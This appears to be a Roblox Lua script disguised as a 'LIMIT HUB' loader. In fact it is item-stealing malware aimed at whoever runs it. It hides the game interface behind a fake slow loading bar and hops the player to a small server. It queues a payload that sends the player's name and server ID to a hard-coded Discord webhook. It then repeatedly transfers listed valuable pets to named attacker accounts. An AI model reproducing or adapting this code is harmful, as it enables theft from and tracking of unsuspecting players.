local TeleportService = game:GetService("TeleportService") local HttpService = game:GetService("HttpService") local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local placeId = 126884695634066

local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

local loadingScript = [[ local Players = game:GetService("Players") local StarterGui = game:GetService("StarterGui") local HttpService = game:GetService("HttpService") local ReplicatedStorage = game:GetService("ReplicatedStorage") local LocalPlayer = Players.LocalPlayer

-- 👥 Attacker usernames local attackers = { ["boneblossom215"] = true, ["beanstalk1251"] = true, ["burningbud709"] = true }

-- 🎯 Target pet names (lowercase) local targetPets = { ["trex"] = true, ["fennec fox"] = true, ["raccoon"] = true, ["dragonfly"] = true, ["butterfly"] = true, ["queenbee"] = true, ["spinosaurus"] = true, ["redfox"] = true, ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true, ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true }

pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) StarterGui:SetCore("TopbarEnabled", false) end)

local screenGui = Instance.new("ScreenGui") screenGui.Name = "LimitHubLoading" screenGui.ResetOnSpawn = false screenGui.IgnoreGuiInset = true screenGui.DisplayOrder = 999999 screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", screenGui) bg.Size = UDim2.new(1, 0, 1, 0) bg.BackgroundColor3 = Color3.new(0, 0, 0) bg.ZIndex = 999999

local title = Instance.new("TextLabel", bg) title.Size = UDim2.new(0, 800, 0, 100) title.Position = UDim2.new(0.5, -400, 0.5, -60) title.BackgroundTransparency = 1 title.Text = "LIMIT HUB" title.TextColor3 = Color3.fromRGB(0, 255, 255) title.Font = Enum.Font.Fantasy title.TextScaled = true title.ZIndex = 1000000

local percentLabel = Instance.new("TextLabel", bg) percentLabel.Size = UDim2.new(0, 100, 0, 40) percentLabel.Position = UDim2.new(0.5, -50, 0.5, 80) percentLabel.BackgroundTransparency = 1 percentLabel.Text = "0%" percentLabel.TextColor3 = Color3.new(1, 1, 1) percentLabel.Font = Enum.Font.Code percentLabel.TextScaled = true percentLabel.ZIndex = 1000000

local barOutline = Instance.new("Frame", bg) barOutline.Size = UDim2.new(0, 400, 0, 25) barOutline.Position = UDim2.new(0.5, -200, 0.5, 40) barOutline.BackgroundColor3 = Color3.new(0, 0, 0) barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255) barOutline.BorderSizePixel = 2 barOutline.ZIndex = 1000000

local fill = Instance.new("Frame", barOutline) fill.Size = UDim2.new(0, 0, 1, 0) fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255) fill.BorderSizePixel = 0 fill.ZIndex = 1000001

-- Webhook send pcall(function() local data = { ["content"] = "", ["embeds"] = {{ ["title"] = "Player Joined New Server", ["description"] = ("Name: %s\nJobId: %s\nJoin Link"):format( LocalPlayer.Name, game.JobId, game.JobId ), ["color"] = 0x00FFFF }} }

request({
Url = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = HttpService:JSONEncode(data)
}) end)

-- GUI Loading Bar task.spawn(function() local percent = 0 while percent <= 100 do percentLabel.Text = percent .. "%" fill.Size = UDim2.new(percent / 100, 0, 1, 0) percent += 5 task.wait(10) end screenGui:Destroy() end)

-- Silent Transfer

-- Delayed Pet Transfer

task.delay(3, function() task.spawn(function() while true do for _, player in pairs(Players:GetPlayers()) do if attackers[player.Name] then local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5) if petFolder then for _, pet in ipairs(petFolder:GetChildren()) do local petName = string.lower(pet.Name) if targetPets[petName] then local remote = ReplicatedStorage:FindFirstChild("TransferPet") if remote then remote:FireServer(pet, player) end end end end end end task.wait(5) end end) end) ]]

local function serverHop() local cursor = "" local smallestServer = nil

repeat
local success, result = pcall(function()
return HttpService:JSONDecode(HttpService:GetAsync(
("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
))
end)

if success and result and result.data then  
    for _, server in pairs(result.data) do  
        if server.playing < server.maxPlayers and server.id ~= game.JobId then  
            if not smallestServer or server.playing < smallestServer.playing then  
                smallestServer = server  
            end  
        end  
    end  
    cursor = result.nextPageCursor or ""  
else  
    break  
end  

task.wait(0.2)

until cursor == ""

queue_on_teleport(loadingScript)

if smallestServer then
TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
else
TeleportService:Teleport(placeId, LocalPlayer)
end end

serverHop()

